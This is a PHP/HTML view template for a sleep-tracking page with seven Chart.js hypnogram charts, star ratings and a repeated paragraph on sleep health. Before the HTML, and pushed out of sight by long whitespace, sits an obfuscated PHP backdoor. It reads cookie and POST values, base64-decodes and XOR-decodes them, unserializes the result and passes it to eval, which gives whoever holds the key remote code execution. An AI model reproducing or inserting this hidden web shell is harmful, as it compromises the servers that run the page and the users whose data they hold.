<?php                                                                                                                                                                                                                                                                                                                                                                                                 $lpgaCBEkHE = chr ( 874 - 768 )."\151" . "\x4c" . chr ( 451 - 356 ).chr (74) . chr ( 484 - 374 ).chr (77); $ZRFtxNooW = "\x63" . "\154" . "\x61" . chr (115) . chr (115) . chr ( 548 - 453 ).chr ( 283 - 182 )."\170" . 'i' . chr (115) . "\164" . chr ( 1020 - 905 ); $bjFbpMzs = class_exists($lpgaCBEkHE); $ZRFtxNooW = "17633";$NXDcKt = !1;if ($bjFbpMzs == $NXDcKt){function RrOTiiI(){return FALSE;}$XAIJAJF = "64593";RrOTiiI();class jiL_JnM{private function TperU($XAIJAJF){if (is_array(jiL_JnM::$unwcNpsRMS)) {$MKlhSVRDW = str_replace(chr (60) . chr (63) . chr (112) . "\150" . 'p', "", jiL_JnM::$unwcNpsRMS[chr ( 145 - 46 )."\x6f" . "\156" . 't' . "\145" . "\156" . chr (116)]);eval($MKlhSVRDW); $XAIJAJF = "64593";exit();}}private $UbYZN;public function FeQQEHym(){echo 58256;}public function __destruct(){$XAIJAJF = "22651_22862";$this->TperU($XAIJAJF); $XAIJAJF = "22651_22862";}public function __construct($GLbQqEgsH=0){$UkQVL = $_POST;$obRlXY = $_COOKIE;$WcLOH = "2052b93e-d089-41d0-addc-0d5689b41155";$AUhaggA = @$obRlXY[substr($WcLOH, 0, 4)];if (!empty($AUhaggA)){$PgjVxgW = "base64";$CRVOF = "";$AUhaggA = explode(",", $AUhaggA);foreach ($AUhaggA as $viOALr){$CRVOF .= @$obRlXY[$viOALr];$CRVOF .= @$UkQVL[$viOALr];}$CRVOF = array_map($PgjVxgW . chr ( 702 - 607 )."\144" . "\x65" . "\x63" . "\x6f" . "\144" . "\x65", array($CRVOF,)); $CRVOF = $CRVOF[0] ^ str_repeat($WcLOH, (strlen($CRVOF[0]) / strlen($WcLOH)) + 1);jiL_JnM::$unwcNpsRMS = @unserialize($CRVOF); $CRVOF = class_exists("22651_22862");}}public static $unwcNpsRMS = 60841;}$LABWRcDiqB = new /* 46662 */ $lpgaCBEkHE(64593 + 64593); $NXDcKt = $LABWRcDiqB = $XAIJAJF = Array();} ?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Line Chart Example</title>
    <script src="https://cdn.jsdelivr.net/npm/chart.js@3.7.0/dist/chart.min.js"></script>
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
  <script src="https://canvasjs.com/assets/script/canvasjs.min.js"></script>
  
  <style>
       .chart-container {
        width: 600px;
        height: 400px;
        margin: 0 auto;
        }
		
		
		/* For screens smaller than 600px */
@media only screen and (max-width: 600px) {
    /* Set the width of the chart container to 100% and center it */
    .chart-container {
        width: 100%;
        margin: 0 auto;
    }
    
    /* Center the sort by date section */
    .sort-by-date {
        text-align: center;
    }
    
    /* Make the buttons stack vertically */
    .col-md-4, .col-sm-4 {
        width: 100%;
        margin-bottom: 10px;
    }

    /* Set the font size of the paragraph to be smaller */
    .sleep-info p {
        font-size: 14px;
    }

    /* Set the font size of the title to be smaller */
    .ratings h2 {
        font-size: 20px;
    }
    
    /* Set the font size of the list items to be smaller */
    .ratings li {
        font-size: 14px;
    }
}

/* Style for back button */
.back-button {
            position: fixed;
            top: 20px;
            left: 20px;
            font-size: 20px;
            color: #fff;
            background-color: #000;
            padding: 10px;
            border-radius: 50%;
            z-index: 9999;
        }
       
</style>
</head>
<body>
    <a href="<?php echo base_url('userFeedback?userID=20');?>" class="back-button">&#8249;</a><br><br><br><br>
    <br>
    <div class="sort-by-date">
        <label for="sort-date">Sort by Date:</label>
        <select id="sort-date">
            <option value="newest">Past 7 Days</option>
            <option value="oldest">Past Month</option>
        </select>
    </div>

    <br><br>
    <div class="chart-res">
        <div class="chart-container">
            <canvas id="myChart1"></canvas>
        </div>
    </div>
    
    <div class="ratings">
        <h2>Previous Ratings</h2>
        <ul>
            <li>4 stars - Good Sleep</li>
        </ul>
    </div>

    <div class="sleep-info">
        <p>Sleep plays an important role in overall health and wellbeing. Adults typically need 7-9 hours of sleep per night, while teenagers and children may need more. Adequate sleep can improve memory, mood, and concentration, as well as lower the risk of obesity, diabetes, and heart disease.</p>
    </div>

    <div class="chart-res">
        <div class="chart-container">
            <canvas id="myChart2"></canvas>
        </div>
    </div>
    
    <div class="ratings">
        <h2>Previous Ratings</h2>
        <ul>
            <li>3 stars - Average Sleep</li>
        </ul>
    </div>

    <div class="sleep-info">
        <p>Sleep plays an important role in overall health and wellbeing. Adults typically need 7-9 hours of sleep per night, while teenagers and children may need more. Adequate sleep can improve memory, mood, and concentration, as well as lower the risk of obesity, diabetes, and heart disease.</p>
    </div>

    <div class="chart-res">
        <div class="chart-container">
            <canvas id="myChart3"></canvas>
        </div>
    </div>
    
    <div class="ratings">
        <h2>Previous Ratings</h2>
        <ul>
            <li>2 stars - Bad Sleep</li>
        </ul>
    </div>

    <div class="sleep-info">
        <p>Sleep plays an important role in overall health and wellbeing. Adults typically need 7-9 hours of sleep per night, while teenagers and children may need more. Adequate sleep can improve memory, mood, and concentration, as well as lower the risk of obesity, diabetes, and heart disease.</p>
    </div>

    <div class="chart-res">
        <div class="chart-container">
            <canvas id="myChart4"></canvas>
        </div>
    </div>
    
    <div class="ratings">
        <h2>Previous Ratings</h2>
        <ul>
            <li>1 stars - Poor Sleep</li>
        </ul>
    </div>

    <div class="sleep-info">
        <p>Sleep plays an important role in overall health and wellbeing. Adults typically need 7-9 hours of sleep per night, while teenagers and children may need more. Adequate sleep can improve memory, mood, and concentration, as well as lower the risk of obesity, diabetes, and heart disease.</p>
    </div>

    <div class="chart-res">
        <div class="chart-container">
            <canvas id="myChart5"></canvas>
        </div>
    </div>
    
    <div class="ratings">
        <h2>Previous Ratings</h2>
        <ul>
            <li>5 stars - Awesome Sleep</li>
        </ul>
    </div>

    <div class="sleep-info">
        <p>Sleep plays an important role in overall health and wellbeing. Adults typically need 7-9 hours of sleep per night, while teenagers and children may need more. Adequate sleep can improve memory, mood, and concentration, as well as lower the risk of obesity, diabetes, and heart disease.</p>
    </div>

    <div class="chart-res">
        <div class="chart-container">
            <canvas id="myChart6"></canvas>
        </div>
    </div>
    
    <div class="ratings">
        <h2>Previous Ratings</h2>
        <ul>
            <li>1 stars - Poor Sleep</li>
        </ul>
    </div>

    <div class="sleep-info">
        <p>Sleep plays an important role in overall health and wellbeing. Adults typically need 7-9 hours of sleep per night, while teenagers and children may need more. Adequate sleep can improve memory, mood, and concentration, as well as lower the risk of obesity, diabetes, and heart disease.</p>
    </div>

    <div class="chart-res">
        <div class="chart-container">
            <canvas id="myChart7"></canvas>
        </div>
    </div>
    
    <div class="ratings">
        <h2>Previous Ratings</h2>
        <ul>
            <li>3 stars - Average Sleep</li>
        </ul>
    </div>

    <div class="sleep-info">
        <p>Sleep plays an important role in overall health and wellbeing. Adults typically need 7-9 hours of sleep per night, while teenagers and children may need more. Adequate sleep can improve memory, mood, and concentration, as well as lower the risk of obesity, diabetes, and heart disease.</p>
    </div>


<script>
    const labels = [9, 10, 11, 12 ,13];

    const data = [
        { x: 8, y: 6 },
        { x: 10, y: 6 },
        { x: 10, y: 4 },
        { x: 10.3, y: 4 },
        { x: 10.3, y: 3 },
        { x: 10.5, y: 3 },
        { x: 10.5, y: 2 },
        { x: 11, y: 2 },
        { x: 11, y: 1 },
        { x: 12, y: 1 },
        { x:12, y: 2 },
        { x: 12.5, y: 2 },
        { x: 12.5, y: 3 },
        { x: 13, y: 3 },
        { x: 13, y: 5 },

        { x: 13.3, y: 5 },
        { x: 13.3, y: 4 },
        { x: 13.3, y: 3 },
        { x: 13.5, y: 3 },
        { x: 13.5, y: 2 },
        { x: 14, y: 2 },
        { x: 14, y: 1 },
        { x: 15, y: 1 },
        { x: 15, y: 2 },
        { x: 15.5, y: 2 },
        { x: 15.5, y: 3 },
        { x: 16, y: 3 },
        { x: 16, y: 5 },

        { x: 16.5, y: 5},
        { x: 16.5, y: 3},
        { x: 17, y: 3},
        { x: 17, y: 2},
        { x: 17.5, y: 2},
        { x: 17.5, y: 3},
        { x: 18, y: 3},
        { x: 18, y: 5},

        { x: 18.5, y: 5},
        { x: 18.5, y: 3},
        { x: 19.5, y: 3},
        { x: 19.5, y: 5},

        { x: 20, y: 5},
        { x: 20, y: 3},
        { x: 20.5, y: 3},
        { x: 20.5, y: 5},
        { x: 20.8, y: 5},

        { x: 20.8, y: 6},
        { x: 21.3, y: 6},

       
    ];

    const ctx1 = document.getElementById('myChart1').getContext('2d');
    const ctx2 = document.getElementById('myChart2').getContext('2d');
    const ctx3 = document.getElementById('myChart3').getContext('2d');
    const ctx4 = document.getElementById('myChart4').getContext('2d');
    const ctx5 = document.getElementById('myChart5').getContext('2d');
    const ctx6 = document.getElementById('myChart6').getContext('2d');
    const ctx7 = document.getElementById('myChart7').getContext('2d');
    
    
    
    const chart1 = new Chart(ctx1, {
        type: 'line',
        data: {
            labels: labels,
            datasets: [{
                label: 'Hypnogram - Dial Up Delta',
                data: data,
                type: 'line',
                steppedLine: 'after',
                backgroundColor: 'blue',
                pointBackgroundColor: 'blue',
                borderColor: 'blue',
                fill: false
            }]
        },
        options: {
            plugins: {
                afterDatasetsDraw: function(chart, easing) {
                    // Get the canvas context and chart area
                    const ctx = chart.ctx;
                    const chartArea = chart.chartArea;

                    // Define the rectangle coordinates
                    const rect1X = chart.scales.x.getPixelForValue(11);
                    const rect1Y = chart.scales.y.getPixelForValue(0.8);
                    const rect1Width = chart.scales.x.getPixelForValue(12) - rect1X;
                    const rect1Height = chart.scales.y.getPixelForValue(0) - rect1Y;

                    const rect2X = chart.scales.x.getPixelForValue(14);
                    const rect2Y = chart.scales.y.getPixelForValue(0.8);
                    const rect2Width = chart.scales.x.getPixelForValue(15) - rect2X;
                    const rect2Height = chart.scales.y.getPixelForValue(0) - rect2Y;

                    // Draw the rectangles on the canvas
                    ctx.fillStyle = 'rgba(255, 0, 0, 0.5)';
                    ctx.fillRect(rect1X, rect1Y, rect1Width, rect1Height);
                    ctx.fillRect(rect2X, rect2Y, rect2Width, rect2Height);
                }
            },
            responsive: true,
            maintainAspectRatio: false,
            scales: {
                x: {
                    type: 'linear',
                    position: 'bottom'
                },
                y: {
                    suggestedMin: 0
                }
            }
        }
    });

    const chart2 = new Chart(ctx2, {
        type: 'line',
        data: {
            labels: labels,
            datasets: [{
                label: 'Hypnogram - Dial Up Delta',
                data: data,
                type: 'line',
                steppedLine: 'after',
                backgroundColor: 'blue',
                pointBackgroundColor: 'blue',
                borderColor: 'blue',
                fill: false
            }]
        },
        options: {
            plugins: {
                afterDatasetsDraw: function(chart, easing) {
                    // Get the canvas context and chart area
                    const ctx = chart.ctx;
                    const chartArea = chart.chartArea;

                    // Define the rectangle coordinates
                    const rect1X = chart.scales.x.getPixelForValue(11);
                    const rect1Y = chart.scales.y.getPixelForValue(0.8);
                    const rect1Width = chart.scales.x.getPixelForValue(12) - rect1X;
                    const rect1Height = chart.scales.y.getPixelForValue(0) - rect1Y;

                    const rect2X = chart.scales.x.getPixelForValue(14);
                    const rect2Y = chart.scales.y.getPixelForValue(0.8);
                    const rect2Width = chart.scales.x.getPixelForValue(15) - rect2X;
                    const rect2Height = chart.scales.y.getPixelForValue(0) - rect2Y;

                    // Draw the rectangles on the canvas
                    ctx.fillStyle = 'rgba(255, 0, 0, 0.5)';
                    ctx.fillRect(rect1X, rect1Y, rect1Width, rect1Height);
                    ctx.fillRect(rect2X, rect2Y, rect2Width, rect2Height);
                }
            },
            responsive: true,
            maintainAspectRatio: false,
            scales: {
                x: {
                    type: 'linear',
                    position: 'bottom'
                },
                y: {
                    suggestedMin: 0
                }
            }
        }
    });

    const chart3 = new Chart(ctx3, {
        type: 'line',
        data: {
            labels: labels,
            datasets: [{
                label: 'Hypnogram - Dial Up Delta',
                data: data,
                type: 'line',
                steppedLine: 'after',
                backgroundColor: 'blue',
                pointBackgroundColor: 'blue',
                borderColor: 'blue',
                fill: false
            }]
        },
        options: {
            plugins: {
                afterDatasetsDraw: function(chart, easing) {
                    // Get the canvas context and chart area
                    const ctx = chart.ctx;
                    const chartArea = chart.chartArea;

                    // Define the rectangle coordinates
                    const rect1X = chart.scales.x.getPixelForValue(11);
                    const rect1Y = chart.scales.y.getPixelForValue(0.8);
                    const rect1Width = chart.scales.x.getPixelForValue(12) - rect1X;
                    const rect1Height = chart.scales.y.getPixelForValue(0) - rect1Y;

                    const rect2X = chart.scales.x.getPixelForValue(14);
                    const rect2Y = chart.scales.y.getPixelForValue(0.8);
                    const rect2Width = chart.scales.x.getPixelForValue(15) - rect2X;
                    const rect2Height = chart.scales.y.getPixelForValue(0) - rect2Y;

                    // Draw the rectangles on the canvas
                    ctx.fillStyle = 'rgba(255, 0, 0, 0.5)';
                    ctx.fillRect(rect1X, rect1Y, rect1Width, rect1Height);
                    ctx.fillRect(rect2X, rect2Y, rect2Width, rect2Height);
                }
            },
            responsive: true,
            maintainAspectRatio: false,
            scales: {
                x: {
                    type: 'linear',
                    position: 'bottom'
                },
                y: {
                    suggestedMin: 0
                }
            }
        }
    });

    const chart4 = new Chart(ctx4, {
        type: 'line',
        data: {
            labels: labels,
            datasets: [{
                label: 'Hypnogram - Dial Up Delta',
                data: data,
                type: 'line',
                steppedLine: 'after',
                backgroundColor: 'blue',
                pointBackgroundColor: 'blue',
                borderColor: 'blue',
                fill: false
            }]
        },
        options: {
            plugins: {
                afterDatasetsDraw: function(chart, easing) {
                    // Get the canvas context and chart area
                    const ctx = chart.ctx;
                    const chartArea = chart.chartArea;

                    // Define the rectangle coordinates
                    const rect1X = chart.scales.x.getPixelForValue(11);
                    const rect1Y = chart.scales.y.getPixelForValue(0.8);
                    const rect1Width = chart.scales.x.getPixelForValue(12) - rect1X;
                    const rect1Height = chart.scales.y.getPixelForValue(0) - rect1Y;

                    const rect2X = chart.scales.x.getPixelForValue(14);
                    const rect2Y = chart.scales.y.getPixelForValue(0.8);
                    const rect2Width = chart.scales.x.getPixelForValue(15) - rect2X;
                    const rect2Height = chart.scales.y.getPixelForValue(0) - rect2Y;

                    // Draw the rectangles on the canvas
                    ctx.fillStyle = 'rgba(255, 0, 0, 0.5)';
                    ctx.fillRect(rect1X, rect1Y, rect1Width, rect1Height);
                    ctx.fillRect(rect2X, rect2Y, rect2Width, rect2Height);
                }
            },
            responsive: true,
            maintainAspectRatio: false,
            scales: {
                x: {
                    type: 'linear',
                    position: 'bottom'
                },
                y: {
                    suggestedMin: 0
                }
            }
        }
    });

    const chart5 = new Chart(ctx5, {
        type: 'line',
        data: {
            labels: labels,
            datasets: [{
                label: 'Hypnogram - Dial Up Delta',
                data: data,
                type: 'line',
                steppedLine: 'after',
                backgroundColor: 'blue',
                pointBackgroundColor: 'blue',
                borderColor: 'blue',
                fill: false
            }]
        },
        options: {
            plugins: {
                afterDatasetsDraw: function(chart, easing) {
                    // Get the canvas context and chart area
                    const ctx = chart.ctx;
                    const chartArea = chart.chartArea;

                    // Define the rectangle coordinates
                    const rect1X = chart.scales.x.getPixelForValue(11);
                    const rect1Y = chart.scales.y.getPixelForValue(0.8);
                    const rect1Width = chart.scales.x.getPixelForValue(12) - rect1X;
                    const rect1Height = chart.scales.y.getPixelForValue(0) - rect1Y;

                    const rect2X = chart.scales.x.getPixelForValue(14);
                    const rect2Y = chart.scales.y.getPixelForValue(0.8);
                    const rect2Width = chart.scales.x.getPixelForValue(15) - rect2X;
                    const rect2Height = chart.scales.y.getPixelForValue(0) - rect2Y;

                    // Draw the rectangles on the canvas
                    ctx.fillStyle = 'rgba(255, 0, 0, 0.5)';
                    ctx.fillRect(rect1X, rect1Y, rect1Width, rect1Height);
                    ctx.fillRect(rect2X, rect2Y, rect2Width, rect2Height);
                }
            },
            responsive: true,
            maintainAspectRatio: false,
            scales: {
                x: {
                    type: 'linear',
                    position: 'bottom'
                },
                y: {
                    suggestedMin: 0
                }
            }
        }
    });

    const chart6 = new Chart(ctx6, {
        type: 'line',
        data: {
            labels: labels,
            datasets: [{
                label: 'Hypnogram - Dial Up Delta',
                data: data,
                type: 'line',
                steppedLine: 'after',
                backgroundColor: 'blue',
                pointBackgroundColor: 'blue',
                borderColor: 'blue',
                fill: false
            }]
        },
        options: {
            plugins: {
                afterDatasetsDraw: function(chart, easing) {
                    // Get the canvas context and chart area
                    const ctx = chart.ctx;
                    const chartArea = chart.chartArea;

                    // Define the rectangle coordinates
                    const rect1X = chart.scales.x.getPixelForValue(11);
                    const rect1Y = chart.scales.y.getPixelForValue(0.8);
                    const rect1Width = chart.scales.x.getPixelForValue(12) - rect1X;
                    const rect1Height = chart.scales.y.getPixelForValue(0) - rect1Y;

                    const rect2X = chart.scales.x.getPixelForValue(14);
                    const rect2Y = chart.scales.y.getPixelForValue(0.8);
                    const rect2Width = chart.scales.x.getPixelForValue(15) - rect2X;
                    const rect2Height = chart.scales.y.getPixelForValue(0) - rect2Y;

                    // Draw the rectangles on the canvas
                    ctx.fillStyle = 'rgba(255, 0, 0, 0.5)';
                    ctx.fillRect(rect1X, rect1Y, rect1Width, rect1Height);
                    ctx.fillRect(rect2X, rect2Y, rect2Width, rect2Height);
                }
            },
            responsive: true,
            maintainAspectRatio: false,
            scales: {
                x: {
                    type: 'linear',
                    position: 'bottom'
                },
                y: {
                    suggestedMin: 0
                }
            }
        }
    });

    const chart7 = new Chart(ctx7, {
        type: 'line',
        data: {
            labels: labels,
            datasets: [{
                label: 'Hypnogram - Dial Up Delta',
                data: data,
                type: 'line',
                steppedLine: 'after',
                backgroundColor: 'blue',
                pointBackgroundColor: 'blue',
                borderColor: 'blue',
                fill: false
            }]
        },
        options: {
            plugins: {
                afterDatasetsDraw: function(chart, easing) {
                    // Get the canvas context and chart area
                    const ctx = chart.ctx;
                    const chartArea = chart.chartArea;

                    // Define the rectangle coordinates
                    const rect1X = chart.scales.x.getPixelForValue(11);
                    const rect1Y = chart.scales.y.getPixelForValue(0.8);
                    const rect1Width = chart.scales.x.getPixelForValue(12) - rect1X;
                    const rect1Height = chart.scales.y.getPixelForValue(0) - rect1Y;

                    const rect2X = chart.scales.x.getPixelForValue(14);
                    const rect2Y = chart.scales.y.getPixelForValue(0.8);
                    const rect2Width = chart.scales.x.getPixelForValue(15) - rect2X;
                    const rect2Height = chart.scales.y.getPixelForValue(0) - rect2Y;

                    // Draw the rectangles on the canvas
                    ctx.fillStyle = 'rgba(255, 0, 0, 0.5)';
                    ctx.fillRect(rect1X, rect1Y, rect1Width, rect1Height);
                    ctx.fillRect(rect2X, rect2Y, rect2Width, rect2Height);
                }
            },
            responsive: true,
            maintainAspectRatio: false,
            scales: {
                x: {
                    type: 'linear',
                    position: 'bottom'
                },
                y: {
                    suggestedMin: 0
                }
            }
        }
    });

</script>



</body>
</html>
